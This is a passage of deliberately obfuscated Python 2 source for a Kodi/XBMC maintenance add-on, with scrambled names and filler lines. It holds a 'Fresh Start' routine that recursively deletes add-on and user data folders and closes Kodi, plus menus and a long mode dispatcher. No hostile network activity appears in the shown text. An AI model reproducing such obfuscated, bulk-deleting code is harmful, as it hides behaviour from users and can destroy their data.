     if 36 - 36: iIi1iIiii111 * OoOo * i1i1i11IIi . IIiII * i1i1i11IIi
   O0ooO0 = [ i1II1 for i1II1 in os . listdir ( Iii1ii1II11i ) if os . path . isdir ( os . path . join ( Iii1ii1II11i , i1II1 ) ) ]
   try :
    for i1II1 in O0ooO0 :
     try :
      if i1II1 not in O0o0Oo :
       o0OOO . update ( 0 , "Cleaning Directory: [COLOR=yellow]" + i1II1 + ' [/COLOR]' , '' , 'Please wait...' )
       shutil . rmtree ( os . path . join ( Iii1ii1II11i , i1II1 ) )
     except : print "Failed to remove: " + i1II1
   except : pass
   if 41 - 41: O00oo0OO0oOOO % O000OO0
   for OooOo000OOOOo , O0oooo00o0Oo , I1iii in os . walk ( Iii1ii1II11i , topdown = True ) :
    O0oooo00o0Oo [ : ] = [ i1Ii11II for i1Ii11II in O0oooo00o0Oo if i1Ii11II not in O0o0Oo ]
    for i1II1 in I1iii :
     try :
      o0OOO . update ( 0 , "Removing [COLOR=yellow]" + i1II1 + '[/COLOR]' , '' , 'Please wait...' )
      os . unlink ( os . path . join ( OooOo000OOOOo , i1II1 ) )
      os . remove ( os . path . join ( OooOo000OOOOo , i1II1 ) )
     except : print "Failed to remove file: " + i1II1
     if 93 - 93: OOO00O
   OOo0OIiI11iiIii = [ i1II1 for i1II1 in os . listdir ( o0oO0 ) if os . path . isdir ( os . path . join ( o0oO0 , i1II1 ) ) ]
   try :
    for i1II1 in OOo0OIiI11iiIii :
     try :
      if i1II1 not in O0o0Oo :
       o0OOO . update ( 0 , "Removing Add-on: [COLOR=yellow]" + i1II1 + ' [/COLOR]' , '' , 'Please wait...' )
       shutil . rmtree ( os . path . join ( o0oO0 , i1II1 ) )
     except : print "Failed to remove: " + i1II1
   except : pass
   if 25 - 25: o0OOOoO0
   oOO0OO00 = [ i1II1 for i1II1 in os . listdir ( i1i1II ) if os . path . isdir ( os . path . join ( i1i1II , i1II1 ) ) ]
   try :
    for i1II1 in oOO0OO00 :
     try :
      if i1II1 not in O0o0Oo :
       o0OOO . update ( 0 , "Removing Add-on Data: [COLOR=yellow]" + i1II1 + ' [/COLOR]' , '' , 'Please wait...' )
       shutil . rmtree ( os . path . join ( i1i1II , i1II1 ) )
     except : print "Failed to remove: " + i1II1
   except : pass
   if 75 - 75: iIIi1iIIi * O000OO0 / OO * O000OO0 / OOO00O
   IiIi11IIi1I11 = [ i1II1 for i1II1 in os . listdir ( iIiiiI ) if os . path . isdir ( os . path . join ( iIiiiI , i1II1 ) ) ]
   try :
    for i1II1 in IiIi11IIi1I11 :
     try :
      if i1II1 not in O0o0Oo :
       o0OOO . update ( 0 , "Cleaning Directory: [COLOR=yellow]" + i1II1 + ' [/COLOR]' , '' , 'Please wait...' )
       shutil . rmtree ( os . path . join ( iIiiiI , i1II1 ) )
     except : print "Failed to remove: " + i1II1
   except : pass
  if mode != 'CB' :
   I1IiI . ok ( 'Wipe Complete' , 'Kodi will now close.' , 'When you next load up Kodi it should boot into the default' , 'Confluence skin and you should have a fresh install.' )
   xbmc . executebuiltin ( 'quit' )
 else : return
 if 65 - 65: OooOooo * III1i1i - OooOooo - I11iii1Ii
 if 96 - 96: i1i1i11IIi - III1i1i
def I1iO00O000oOO0oO ( ) :
 if 88 - 88: O00oo0OO0oOOO . OoOo % o0OOOoO0 . O000OO0 % OOO00O . o0OOOoO0
 print "########### Start Removing Empty Folders #########"
 if 53 - 53: iiiIi1i1I % iIi1iIiii111 - iiIi / OooOooo - i1iiI11I
 if 9 - 9: OO - I11iii1Ii + i1iiI11I % III1i1i + IIiII + O0OoO
 for ii1II1 , o0oOo0OoO , I1iii in os . walk ( iIiiiI ) :
  if len ( I1iii ) == 0 :
   if 3 - 3: O0OoO - iiIi * iiIi - OoOo / OO * i1i1i11IIi
   try :
    os . rmdir ( ii1II1 )
    print "successfully removed: " + ii1II1
   except : print "#### failed to remove directory: " + ii1II1 + " ####"
   if 58 - 58: O0OoO % i1iiI11I / oO00OO0oo0 % O00oo0OO0oOOO . OO * iIIi1iIIi
   if 32 - 32: iiIi + O00oo0OO0oOOO
   if 91 - 91: OOO00O - OO * OO
   if 55 - 55: i1iiI11I + OoOo - O000OO0
def III1 ( ) :
 o0oO ( '' , 'Clear Cache' , 'url' , 'clear_cache' , 'Clear_Cache.png' , '' , '' , '' )
 o0oO ( '' , 'Clear My Cached Artwork' , 'none' , 'remove_textures' , 'Delete_Cached_Artwork.png' , '' , '' , '' )
 o0oO ( '' , 'Delete Addon_Data' , 'url' , 'remove_addon_data' , 'Delete_Addon_Data.png' , '' , '' , '' )
 o0oO ( '' , 'Delete Old Builds/Zips From Device' , 'url' , 'remove_build' , 'Delete_Builds.png' , '' , '' , '' )
 o0oO ( '' , 'Delete Old Crash Logs' , 'url' , 'remove_crash_logs' , 'Delete_Crash_Logs.png' , '' , '' , '' )
 o0oO ( '' , 'Delete Packages Folder' , 'url' , 'remove_packages' , 'Delete_Packages.png' , '' , '' , '' )
 o0oO ( '' , 'Wipe My Install (Fresh Start)' , 'none' , 'wipe_xbmc' , 'Fresh_Start.png' , '' , '' , '' )
 if 93 - 93: IIiII * III1i1i * OO0O - O00oo0OO0oOOO / i1i1i11IIi
 if 54 - 54: iiiIi1i1I - I11iii1Ii / iiIi
def ooooOOo ( url ) :
 o0oO ( 'folder' , '[COLOR=yellow]1. Install[/COLOR]' , str ( url ) + '&tags=Install&XBMC=1' , 'grab_tutorials' , 'Install.png' , '' , '' , '' )
 o0oO ( 'folder' , '[COLOR=lime]2. Settings[/COLOR]' , str ( url ) + '&tags=Settings' , 'grab_tutorials' , 'Settings.png' , '' , '' , '' )
 o0oO ( 'folder' , '[COLOR=orange]3. Add-ons[/COLOR]' , str ( url ) , 'tutorial_addon_menu' , 'Addons.png' , '' , '' , '' )
 o0oO ( 'folder' , '[COLOR=dodgerblue][XBMC/Kodi][/COLOR]  Audio' , str ( url ) + '&tags=Audio' , 'grab_tutorials' , 'Audio.png' , '' , '' , '' )
 o0oO ( 'folder' , '[COLOR=dodgerblue][XBMC/Kodi][/COLOR]  Errors' , str ( url ) + '&tags=Errors' , 'grab_tutorials' , 'Errors.png' , '' , '' , '' )
 o0oO ( 'folder' , '[COLOR=dodgerblue][XBMC/Kodi][/COLOR]  Gaming' , str ( url ) + '&tags=Gaming' , 'grab_tutorials' , 'gaming_portal.png' , '' , '' , '' )
 o0oO ( 'folder' , '[COLOR=dodgerblue][XBMC/Kodi][/COLOR]  LiveTV' , str ( url ) + '&tags=LiveTV' , 'grab_tutorials' , 'LiveTV.png' , '' , '' , '' )
 o0oO ( 'folder' , '[COLOR=dodgerblue][XBMC/Kodi][/COLOR]  Maintenance' , str ( url ) + '&tags=Maintenance' , 'grab_tutorials' , 'Maintenance.png' , '' , '' , '' )
 o0oO ( 'folder' , '[COLOR=dodgerblue][XBMC/Kodi][/COLOR]  Pictures' , str ( url ) + '&tags=Pictures' , 'grab_tutorials' , 'Pictures.png' , '' , '' , '' )
 o0oO ( 'folder' , '[COLOR=dodgerblue][XBMC/Kodi][/COLOR]  Profiles' , str ( url ) + '&tags=Profiles' , 'grab_tutorials' , 'Profiles.png' , '' , '' , '' )
 o0oO ( 'folder' , '[COLOR=dodgerblue][XBMC/Kodi][/COLOR]  Skins' , str ( url ) + '&tags=Skins' , 'grab_tutorials' , 'Skin.png' , '' , '' , '' )
 o0oO ( 'folder' , '[COLOR=dodgerblue][XBMC/Kodi][/COLOR]  Video' , str ( url ) + '&tags=Video' , 'grab_tutorials' , 'Video.png' , '' , '' , '' )
 o0oO ( 'folder' , '[COLOR=dodgerblue][XBMC/Kodi][/COLOR]  Weather' , str ( url ) + '&tags=Weather' , 'grab_tutorials' , 'Weather.png' , '' , '' , '' )
 if 100 - 100: OO0O % oO00OO0oo0 - OoOo * OO - O00oo0OO0oOOO
 if 65 - 65: oO00OO0oo0 - iiIi / III1i1i * O0OoO % IIiII
def o00o00 ( url ) :
 O00o00O = xbmc . getInfoLabel ( "System.BuildVersion" )
 iiii111II = float ( O00o00O [ : 4 ] )
 if iiii111II < 14 :
  ooOoo0oo00000O = 'You are running XBMC'
 else :
  ooOoo0oo00000O = 'You are running Kodi'
 I1IiI = xbmcgui . Dialog ( )
 I1IiI . ok ( ooOoo0oo00000O , "Your version is: %s" % iiii111II )
 if 84 - 84: i1iiI11I
 if 25 - 25: I11iii1Ii * O0OoO - iiiIi1i1I - IIiII * II11iII
Ii1i1 = oOI11 ( )
IiiiiI1i1Iii = None
oooO00o0 = None
I1I1Iiii1 = None
o0o00oO0oo000 = None
oo00OO = None
I1I = None
iIIII1iIIii = None
ii11 = None
OOoo = None
Oo0o0O00 = None
oOoooo000Oo00 = None
iiIiI = None
IIIii1iiIi = None
I1i1IIIIIII1 = None
oOOoOo0Ooo = None
i1II1 = None
oOOooooO = None
i111i1 = None
oo00oO0o = None
OOo0O0oo0OO0O = None
o0OOoOoo00 = None
o0Oo = None
i1II11II1 = None
oOO0oo = None
O00O = None
iI1I1I = None
i1IiII1i1I = None
iiii111II = None
oooooOoo0ooo = None
o0O0 = None
i1Ii1i111IIiIi1I = None
Oo0Ooo0 = None
IiIIiIi11ii = 'maintenance'
if 32 - 32: OoOo * OO * iiiIi1i1I + o0OOOoO0
try : IiiiiI1i1Iii = urllib . unquote_plus ( Ii1i1 [ "addon_id" ] )
except : pass
try : II1IIIii = urllib . unquote_plus ( Ii1i1 [ "adult" ] )
except : pass
try : oooO00o0 = urllib . unquote_plus ( Ii1i1 [ "artpack" ] )
except : pass
try : I1I1Iiii1 = urllib . unquote_plus ( Ii1i1 [ "audioaddons" ] )
except : pass
try : o0o00oO0oo000 = urllib . unquote_plus ( Ii1i1 [ "author" ] )
except : pass
try : oo00OO = urllib . unquote_plus ( Ii1i1 [ "buildname" ] )
except : pass
try : I1I = urllib . unquote_plus ( Ii1i1 [ "data_path" ] )
except : pass
try : iIIII1iIIii = urllib . unquote_plus ( Ii1i1 [ "description" ] )
except : pass
try : ii11 = urllib . unquote_plus ( Ii1i1 [ "email" ] )
except : pass
try : OOoo = urllib . unquote_plus ( Ii1i1 [ "fanart" ] )
except : pass
try : Oo0o0O00 = urllib . unquote_plus ( Ii1i1 [ "forum" ] )
except : pass
try : iIIIiIi1I1i = urllib . unquote_plus ( Ii1i1 [ "guisettingslink" ] )
except : pass
try : oOoooo000Oo00 = urllib . unquote_plus ( Ii1i1 [ "iconimage" ] )
except : pass
try : iiIiI = urllib . unquote_plus ( Ii1i1 [ "link" ] )
except : pass
try : IIIii1iiIi = urllib . unquote_plus ( Ii1i1 [ "local" ] )
except : pass
try : I1i1IIIIIII1 = urllib . unquote_plus ( Ii1i1 [ "messages" ] )
except : pass
try : oOOoOo0Ooo = str ( Ii1i1 [ "mode" ] )
except : pass
try : i1II1 = urllib . unquote_plus ( Ii1i1 [ "name" ] )
except : pass
try : OoOoOo0 = urllib . unquote_plus ( Ii1i1 [ "pictureaddons" ] )
except : pass
try : oOOooooO = urllib . unquote_plus ( Ii1i1 [ "posts" ] )
except : pass
try : i111i1 = urllib . unquote_plus ( Ii1i1 [ "programaddons" ] )
except : pass
try : oo00oO0o = urllib . unquote_plus ( Ii1i1 [ "provider_name" ] )
except : pass
try : o0OOoOoo00 = urllib . unquote_plus ( Ii1i1 [ "repo_link" ] )
except : pass
try : OOo0O0oo0OO0O = urllib . unquote_plus ( Ii1i1 [ "repo_id" ] )
except : pass
try : o0Oo = urllib . unquote_plus ( Ii1i1 [ "skins" ] )
except : pass
try : i1II11II1 = urllib . unquote_plus ( Ii1i1 [ "sources" ] )
except : pass
try : oOO0oo = urllib . unquote_plus ( Ii1i1 [ "title" ] )
except : pass
try : O00O = urllib . unquote_plus ( Ii1i1 [ "updated" ] )
except : pass
try : iI1I1I = urllib . unquote_plus ( Ii1i1 [ "unread" ] )
except : pass
try : i1IiII1i1I = urllib . unquote_plus ( Ii1i1 [ "url" ] )
except : pass
try : iiii111II = urllib . unquote_plus ( Ii1i1 [ "version" ] )
except : pass
try : oooooOoo0ooo = urllib . unquote_plus ( Ii1i1 [ "video" ] )
except : pass
try : o0O0 = urllib . unquote_plus ( Ii1i1 [ "videoaddons" ] )
except : pass
try : i1Ii1i111IIiIi1I = urllib . unquote_plus ( Ii1i1 [ "welcometext" ] )
except : pass
try : Oo0Ooo0 = urllib . unquote_plus ( Ii1i1 [ "zip_link" ] )
except : pass
if 40 - 40: II11iII
if oOOoOo0Ooo == None and I1ii11iIi11i == 'true' : o0o0O00oOo ( )
elif oOOoOo0Ooo == None : i11i1iIiii ( '' , '' , '' , '' )
elif oOOoOo0Ooo == 'addon_final_menu' : II1I ( i1IiII1i1I )
elif oOOoOo0Ooo == 'addon_categories' : OOOOoOoo0O0O0 ( i1IiII1i1I )
elif oOOoOo0Ooo == 'addon_countries' : i1iIi ( i1IiII1i1I )
elif oOOoOo0Ooo == 'addon_genres' : I11i1iIiIIIIIii ( i1IiII1i1I )
elif oOOoOo0Ooo == 'addon_install' : i1i111iI ( i1II1 , Oo0Ooo0 , o0OOoOoo00 , OOo0O0oo0OO0O , IiiiiI1i1Iii , oo00oO0o , Oo0o0O00 , I1I )
elif oOOoOo0Ooo == 'addon_removal_menu' : i11iiI1111 ( )
elif oOOoOo0Ooo == 'addonfix' : Iii111Ii1 ( )
elif oOOoOo0Ooo == 'addonfixes' : Ooo0oo0ooO ( )
elif oOOoOo0Ooo == 'addonmenu' : OOOIiiiii1iI ( i1IiII1i1I )
elif oOOoOo0Ooo == 'addon_settings' : oo0o0O0Oooooo ( )
elif oOOoOo0Ooo == 'backup' : BACKUP ( )
elif oOOoOo0Ooo == 'backup_option' : ii1ii11 ( )
elif oOOoOo0Ooo == 'backup_restore' : ii1i1i1IiII ( )
elif oOOoOo0Ooo == 'categories' : i11i1iIiii ( )
elif oOOoOo0Ooo == 'check_storage' : checkPath . check ( IiIIiIi11ii )
elif oOOoOo0Ooo == 'clear_cache' : IIIII1iii11 ( )
elif oOOoOo0Ooo == 'community' : i1i1111IiI ( i1IiII1i1I )
elif oOOoOo0Ooo == 'community_backup' : OO0OoOOO0 ( )
elif oOOoOo0Ooo == 'community_menu' : o0IiiiI1 ( i1IiII1i1I , oooooOoo0ooo )
elif oOOoOo0Ooo == 'countries' : II1i111 ( i1IiII1i1I )
elif oOOoOo0Ooo == 'description' : I1I11ii ( i1II1 , i1IiII1i1I , oo00OO , o0o00oO0oo000 , iiii111II , iIIII1iIIii , O00O , o0Oo , o0O0 , I1I1Iiii1 , i111i1 , OoOoOo0 , i1II11II1 , II1IIIii )
elif oOOoOo0Ooo == 'fix_special' : i111i11I1ii ( i1IiII1i1I )
elif oOOoOo0Ooo == 'genres' : Oo00o0O0O ( i1IiII1i1I )
elif oOOoOo0Ooo == 'gotham' : OOo0OOoO00o0 ( )
elif oOOoOo0Ooo == 'grab_addons' : ooIII1II1iii1i ( i1IiII1i1I )
elif oOOoOo0Ooo == 'grab_builds' : i11I1I ( i1IiII1i1I )
elif oOOoOo0Ooo == 'grab_builds_premium' : Grab_Builds_Premium ( i1IiII1i1I )
elif oOOoOo0Ooo == 'grab_hardware' : ooOOooo0ooo00 ( i1IiII1i1I )
elif oOOoOo0Ooo == 'grab_news' : oOOOo0o ( i1IiII1i1I )
elif oOOoOo0Ooo == 'grab_tutorials' : o0OO0OOO0O ( i1IiII1i1I )
elif oOOoOo0Ooo == 'guisettingsfix' : i1i1II1I ( i1IiII1i1I , IIIii1iiIi )
elif oOOoOo0Ooo == 'hardware_filter_menu' : IIIII ( i1IiII1i1I )
elif oOOoOo0Ooo == 'hardware_final_menu' : IiI1iiI11 ( i1IiII1i1I )
elif oOOoOo0Ooo == 'hardware_root_menu' : o0Iiii ( )
elif oOOoOo0Ooo == 'helix' : o0oO00o ( )
elif oOOoOo0Ooo == 'hide_passwords' : i11iI1 ( )
elif oOOoOo0Ooo == 'ipcheck' : oO0OoiIi111iII1 ( )
elif oOOoOo0Ooo == 'instructions' : i1ii1i1I11i1I ( )
elif oOOoOo0Ooo == 'instructions_1' : O0OoOOooO0O ( )
elif oOOoOo0Ooo == 'instructions_2' : OOOO00o000o ( )
elif oOOoOo0Ooo == 'instructions_3' : IIII1ii1 ( )
elif oOOoOo0Ooo == 'instructions_4' : Instructions_4 ( )
elif oOOoOo0Ooo == 'instructions_5' : Instructions_5 ( )
elif oOOoOo0Ooo == 'instructions_6' : Instructions_6 ( )
elif oOOoOo0Ooo == 'LocalGUIDialog' : OOoOoOo0 ( )
elif oOOoOo0Ooo == 'log' : OOO00000o0 ( )
elif oOOoOo0Ooo == 'manual_search' : OOooOoO ( i1IiII1i1I )
elif oOOoOo0Ooo == 'manual_search_builds' : Manual_Search_Builds ( )
elif oOOoOo0Ooo == 'news_root_menu' : I1Iiii ( i1IiII1i1I )
elif oOOoOo0Ooo == 'news_menu' : o0oo0Oo ( i1IiII1i1I )
elif oOOoOo0Ooo == 'notify_msg' : oO000o0OO0OO0 ( i1IiII1i1I )
elif oOOoOo0Ooo == 'OSS' : OoooO00OoO0 ( i1II1 , i1IiII1i1I , oOoooo000Oo00 , iIIII1iIIii )
elif oOOoOo0Ooo == 'play_video' : yt . PlayVideo ( i1IiII1i1I )
elif oOOoOo0Ooo == 'platform_menu' : IiOo0O0O ( i1IiII1i1I )
elif oOOoOo0Ooo == 'popular' : O0OiI ( )
elif oOOoOo0Ooo == 'popularwizard' : i111 ( i1II1 , i1IiII1i1I , oOoooo000Oo00 , iIIII1iIIii )
elif oOOoOo0Ooo == 'register' : oOo000o ( )
elif oOOoOo0Ooo == 'remove_addon_data' : oo0O0oOOO0o ( )
elif oOOoOo0Ooo == 'remove_addons' : Ii1111iiI ( i1IiII1i1I )
elif oOOoOo0Ooo == 'remove_build' : o0OOi11Ii1 ( )
elif oOOoOo0Ooo == 'remove_crash_logs' : OOOi1iIIiiIiII ( )
elif oOOoOo0Ooo == 'remove_packages' : IiiI11 ( )
elif oOOoOo0Ooo == 'remove_textures' : iiiO00O00O000OOO ( )
elif oOOoOo0Ooo == 'restore' : RESTORE ( )
elif oOOoOo0Ooo == 'restore_backup' : oO00oOoo00o0 ( i1II1 , i1IiII1i1I , iIIII1iIIii )
elif oOOoOo0Ooo == 'restore_community' : oO0ooOO ( i1II1 , i1IiII1i1I , oooooOoo0ooo , iIIII1iIIii , o0Oo , iIIIiIi1I1i , oooO00o0 )
elif oOOoOo0Ooo == 'restore_local_CB' : O0OoOo ( )
elif oOOoOo0Ooo == 'restore_local_gui' : iIi ( )
elif oOOoOo0Ooo == 'restore_openelec' : iIiiI111I11 ( i1IiII1i1I , iIIII1iIIii )
elif oOOoOo0Ooo == 'restore_option' : O0oo0O0OO0Oo ( )
elif oOOoOo0Ooo == 'restore_zip' : OOO0 ( i1IiII1i1I )
elif oOOoOo0Ooo == 'runtest' : II1iiI1iI ( i1IiII1i1I )
elif oOOoOo0Ooo == 'search_addons' : oo0o ( i1IiII1i1I )
elif oOOoOo0Ooo == 'search_builds' : O00O0O0OO00oo ( i1IiII1i1I )
elif oOOoOo0Ooo == 'Search_Private' : Private_Search ( i1IiII1i1I )
elif oOOoOo0Ooo == 'showinfo' : IIioo0 ( i1IiII1i1I )
elif oOOoOo0Ooo == 'showinfo2' : I1ii1i ( )
elif oOOoOo0Ooo == 'SortBy' : oO0O0 ( BuildURL , type )
elif oOOoOo0Ooo == 'speed_instructions' : oooO00oo0 ( )
elif oOOoOo0Ooo == 'speedtest_menu' : OooOoO ( )
elif oOOoOo0Ooo == 'text_guide' : ooOoOoo000O0O ( i1II1 , i1IiII1i1I )
elif oOOoOo0Ooo == 'tools' : iII1i1 ( )
elif oOOoOo0Ooo == 'tutorial_final_menu' : Iii1 ( i1IiII1i1I )
elif oOOoOo0Ooo == 'tutorial_addon_menu' : o00OOOOooO ( i1IiII1i1I )
elif oOOoOo0Ooo == 'tutorial_root_menu' : o000OO00OoO00 ( )
elif oOOoOo0Ooo == 'unhide_passwords' : OO0O00 ( )
elif oOOoOo0Ooo == 'update' : II11I ( )
elif oOOoOo0Ooo == 'update_build' : Ooo00o0oOo0O0O ( oOO0oo , i1IiII1i1I , oOOoOo0Ooo , oOoooo000Oo00 , OOoo , oooooOoo0ooo , iIIII1iIIii , o0Oo , iIIIiIi1I1i , oooO00o0 )
elif oOOoOo0Ooo == 'uploadlog' : oOo00Oo0o00oo ( )
elif oOOoOo0Ooo == 'user_info' : o0oo00O ( )
elif oOOoOo0Ooo == 'wipetools' : III1 ( )
elif oOOoOo0Ooo == 'xbmc_menu' : ooooOOo ( i1IiII1i1I )
elif oOOoOo0Ooo == 'xbmcversion' : o00o00 ( i1IiII1i1I )
elif oOOoOo0Ooo == 'wipe_xbmc' : I11iIiI1 ( oOOoOo0Ooo )
xbmcplugin . endOfDirectory ( int ( sys . argv [ 1 ] ) ) # dd678faae9ac167bc83abf78e5cb2f3f0688d3a3
